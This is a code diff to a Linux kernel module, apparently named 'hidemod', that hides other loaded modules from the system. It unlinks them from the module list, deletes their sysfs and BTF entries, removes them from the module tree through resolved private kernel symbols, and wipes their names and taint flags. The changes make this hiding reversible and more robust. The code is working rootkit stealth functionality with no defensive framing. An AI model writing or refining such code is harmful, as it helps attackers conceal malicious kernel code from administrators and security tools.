@@ -10,6 +10,7 @@
 #include <linux/mutex.h>
 #include <linux/sysfs.h>
 #include <linux/workqueue.h>
+#include <linux/poison.h>
 #include <linux/string.h>
 
 #include "hidemod.h"
@@ -20,6 +21,7 @@ struct hm_ctx {
 	const struct hm_resolver *res;
 	struct mutex *module_mutex;
 	struct list_head *anchor_modules;
+	struct kset *module_kset;
 	unsigned long fn_tree_insert;
 	unsigned long fn_tree_remove;
 	struct kobject *btf_kobj;
@@ -40,9 +42,20 @@ static int hm_resolve_ctx(struct hm_ctx *ctx)
 		(struct mutex *)ctx->res->name_to_addr("module_mutex");
 	ctx->anchor_modules =
 		(struct list_head *)ctx->res->name_to_addr("modules");
+	{
+		unsigned long addr = ctx->res->name_to_addr("module_kset");
+
+		if (addr)
+			ctx->module_kset = *(struct kset **)addr;
+	}
 	ctx->fn_tree_insert = ctx->res->name_to_addr("mod_tree_insert");
 	ctx->fn_tree_remove = ctx->res->name_to_addr("mod_tree_remove");
-	ctx->btf_kobj = (struct kobject *)ctx->res->name_to_addr("btf_kobj");
+	{
+		unsigned long addr = ctx->res->name_to_addr("btf_kobj");
+
+		if (addr)
+			ctx->btf_kobj = *(struct kobject **)addr;
+	}
 	return 0;
 }
 
@@ -57,6 +70,22 @@ static void hm_del_btf_file(struct hm_ctx *ctx, struct module *mod)
 	sysfs_remove_bin_file(ctx->btf_kobj, &attr);
 }
 
+static int hm_list_del(struct list_head *node)
+{
+	if (node->prev == LIST_POISON2)
+		return -EALREADY;
+	list_del_rcu(node);
+	synchronize_rcu();
+	return 0;
+}
+
+static void hm_list_restore(struct list_head *node, struct list_head *anchor)
+{
+	if (node->prev != LIST_POISON2)
+		return;
+	list_add(node, anchor);
+}
+
 static int hm_hide_module(struct hm_ctx *ctx, struct hm_obj *obj)
 {
 	struct module *mod = obj->u.mod;
@@ -66,10 +95,8 @@ static int hm_hide_module(struct hm_ctx *ctx, struct hm_obj *obj)
 	if (!anchor)
 		return -ENOENT;
 
-	if (ctx->actions & HM_ACT_LIST) {
-		list_del_rcu(&mod->list);
-		synchronize_rcu();
-	}
+	if (ctx->actions & HM_ACT_LIST)
+		hm_list_del(&mod->list);
 	if (ctx->actions & HM_ACT_SYSFS)
 		kobject_del(&mod->mkobj.kobj);
 	if (ctx->actions & HM_ACT_BTF)
@@ -77,6 +104,7 @@ static int hm_hide_module(struct hm_ctx *ctx, struct hm_obj *obj)
 	if ((ctx->actions & HM_ACT_MOD_TREE) && ctx->fn_tree_remove)
 		((hm_mod_tree_fn)ctx->fn_tree_remove)(mod);
 	if ((ctx->actions & HM_ACT_FIELDS) && mod->name[0]) {
+		strscpy(obj->name_save, mod->name, sizeof(obj->name_save));
 		memset(mod->name, 0, strlen(mod->name));
 		mod->state = MODULE_STATE_LIVE;
 		mod->taints = 0;
@@ -91,9 +119,22 @@ static void hm_unhide_module(struct hm_ctx *ctx, struct hm_obj *obj)
 
 	if ((ctx->actions & HM_ACT_MOD_TREE) && ctx->fn_tree_insert)
 		((hm_mod_tree_fn)ctx->fn_tree_insert)(mod);
+	if ((ctx->actions & HM_ACT_FIELDS) && obj->name_save[0] &&
+	    !mod->name[0])
+		strscpy(mod->name, obj->name_save, MODULE_NAME_LEN);
+	if ((ctx->actions & HM_ACT_SYSFS) && !mod->mkobj.kobj.sd) {
+		int ret;
+
+		/* kobject_del did kobj_kset_leave and cleared parent,
+		 * re-attach the kset so kobject_add lands in module_kset */
+		mod->mkobj.kobj.kset = ctx->module_kset;
+		ret = kobject_add(&mod->mkobj.kobj, NULL, "%s", mod->name);
+		if (ret)
+			pr_warn("[hidemod] kobject_add ret=%d\n", ret);
+	}
 	anchor = obj->anchor ? obj->anchor : ctx->anchor_modules;
-	if ((ctx->actions & HM_ACT_LIST) && anchor && list_empty(&mod->list))
-		list_add(&mod->list, anchor);
+	if ((ctx->actions & HM_ACT_LIST) && anchor)
+		hm_list_restore(&mod->list, anchor);
 }
 
 static int hm_hide_obj(struct hm_ctx *ctx, struct hm_obj *obj)
@@ -102,8 +143,7 @@ static int hm_hide_obj(struct hm_ctx *ctx, struct hm_obj *obj)
 	case HM_OBJ_MODULE:
 		return hm_hide_module(ctx, obj);
 	case HM_OBJ_LIST:
-		list_del_rcu(obj->u.list);
-		synchronize_rcu();
+		hm_list_del(obj->u.list);
 		break;
 	case HM_OBJ_KOBJ:
 		kobject_del(obj->u.kobj);
@@ -257,7 +297,7 @@ int hm_unhide(void)
 		if (obj->type == HM_OBJ_MODULE)
 			hm_unhide_module(ctx, obj);
 		else if (obj->type == HM_OBJ_LIST && obj->anchor)
-			list_add(obj->u.list, obj->anchor);
+			hm_list_restore(obj->u.list, obj->anchor);
 	}
 	if (ctx->module_mutex)
 		mutex_unlock(ctx->module_mutex);
